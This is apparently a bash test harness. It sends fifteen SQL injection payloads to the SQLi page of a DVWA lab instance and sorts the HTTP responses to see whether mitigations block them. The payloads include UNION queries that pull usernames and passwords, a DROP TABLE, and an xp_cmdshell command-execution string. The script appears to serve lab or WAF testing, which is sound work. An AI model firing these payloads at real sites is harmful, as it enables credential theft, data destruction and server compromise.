#!/bin/bash
# Preserved payload corpus against authenticated synthetic DVWA fixtures.
set -euo pipefail
TARGET="${1:?Usage: $0 <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-https}://${TARGET}"
COOKIES=$(mktemp)
trap 'rm -f "$COOKIES"' EXIT
# An ownership-routed, origin-authenticated session avoids blocked public setup suppressing attacks.
python3 "$(dirname "$0")/../../scripts/traffic_fixtures.py" dvwa-session "$TARGET" >"$COOKIES"
echo "[*] SQLi payloads against authenticated DVWA"
PAYLOADS=(
  "5' OR '1'='1"
  "5' OR '1'='1'--"
  "5' UNION SELECT NULL,NULL--"
  "5' UNION SELECT username,password FROM users--"
  "5'; DROP TABLE users;--"
  "5' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
  "5' WAITFOR DELAY '0:0:5'--"
  "5' AND (SELECT COUNT(*) FROM sysobjects)>0--"
  "1 OR 1=1"
  "' OR ''='"
  "admin'--"
  "5' AND SUBSTRING(@@version,1,1)='M'--"
  "5'; EXEC xp_cmdshell('whoami');--"
  "5' UNION ALL SELECT NULL,CONCAT(username,':',password) FROM users--"
  "-1 OR 17-7=10"
)
failed=0
for payload in "${PAYLOADS[@]}"; do
  if ! code=$(curl -sS -b "$COOKIES" -o /dev/null -w "%{http_code}" --max-time 10 \
    --get --data-urlencode "id=${payload}" --data-urlencode "Submit=Submit" \
    "${BASE}/dvwa/vulnerabilities/sqli/"); then
    echo "[TRANSPORT_FAILURE] intended payload dispatch failed"
    failed=1
    continue
  fi
  case "$code" in
  200) outcome=application_response ;;
  403 | 429) outcome=mitigation_candidate ;;
  400 | 422 | 500) outcome=application_rejection ;;
  *)
    outcome=unexpected_application_response
    failed=1
    ;;
  esac
  printf '  [%s] %s
' "$code" "$outcome"
done
exit "$failed"
